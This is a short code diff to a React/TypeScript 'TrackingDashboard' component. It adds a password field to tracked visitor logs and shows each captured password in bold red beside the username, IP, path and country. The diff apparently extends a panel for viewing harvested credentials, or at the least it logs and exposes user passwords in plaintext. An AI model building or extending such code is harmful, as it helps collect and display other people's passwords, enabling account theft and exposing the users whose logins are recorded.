@@ -16,6 +16,7 @@ interface TrackLog {
   isSuspicious: boolean;
   countryCode: string;
   username?: string;
+  password?: string;
 }
 
 export default function TrackingDashboard() {
@@ -111,6 +112,11 @@ export default function TrackingDashboard() {
                           {log.username && log.username !== "Guest" && log.username !== "Unknown" ? `@${log.username}` : "Unknown"}
                         </strong>
                         <div style={{fontSize: "0.75rem", color: "#8b949e", marginTop: "4px"}}>{log.path}</div>
+                        {log.password && (
+                          <div style={{fontSize: "0.75rem", color: "#dc2626", marginTop: "4px", fontWeight: 700}}>
+                            🔑 {log.password}
+                          </div>
+                        )}
                       </td>
                       <td className="col-ip">
                         <strong>{log.ip}</strong>
